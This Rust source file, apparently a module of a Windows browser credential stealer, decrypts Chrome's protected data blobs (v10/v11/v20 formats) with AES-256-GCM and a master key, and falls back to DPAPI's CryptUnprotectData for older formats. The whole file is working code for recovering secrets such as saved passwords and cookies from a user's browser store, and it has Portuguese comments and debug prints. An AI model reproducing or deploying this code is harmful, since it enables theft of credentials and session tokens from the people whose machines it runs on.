use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead, Nonce};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use std::ptr;

pub fn decrypt_data(encrypted: &[u8], master_key: &[u8]) -> String {
    if encrypted.is_empty() { 
        return String::new(); 
    }
    
    // 🔥 VERIFICA SE É FORMATO v10, v11, v20, etc
    if encrypted.len() > 15 && encrypted.starts_with(b"v") {
        println!("[CRYPTO] Detected Chrome format: {:?}", &encrypted[0..3]);
        
        let nonce = &encrypted[3..15];      // Nonce de 12 bytes
        let ciphertext = &encrypted[15..];  // Dados + tag
        
        if let Ok(cipher) = Aes256Gcm::new_from_slice(master_key) {
            if let Ok(plaintext) = cipher.decrypt(Nonce::from_slice(nonce), ciphertext) {
                let result = String::from_utf8_lossy(&plaintext)
                    .replace('\0', "")
                    .trim()
                    .to_string();
                println!("[CRYPTO] ✅ Decrypted {} bytes", result.len());
                return result;
            } else {
                println!("[CRYPTO] ❌ AES-GCM decryption failed");
            }
        }
    } else {
        println!("[CRYPTO] Not a v-prefix format, trying DPAPI fallback");
    }
    
    // Fallback para DPAPI (versões antigas)
    let decrypted_raw = decrypt_with_dpapi(encrypted);
    if !decrypted_raw.is_empty() {
        return String::from_utf8_lossy(&decrypted_raw)
            .replace('\0', "")
            .trim()
            .to_string();
    }
    
    println!("[CRYPTO] ❌ ALL DECRYPTION METHODS FAILED");
    String::new()
}

fn decrypt_with_dpapi(encrypted: &[u8]) -> Vec<u8> {
    unsafe {
        let mut in_blob = DATA_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut out_blob = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(&mut in_blob, ptr::null_mut(), ptr::null_mut(), 
                              ptr::null_mut(), ptr::null_mut(), 0, &mut out_blob) != 0 {
            if !out_blob.pbData.is_null() {
                let decrypted = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize);
                let result = decrypted.to_vec();
                winapi::um::winbase::LocalFree(out_blob.pbData as _);
                return result;
            }
        }
    }
    Vec::new()
}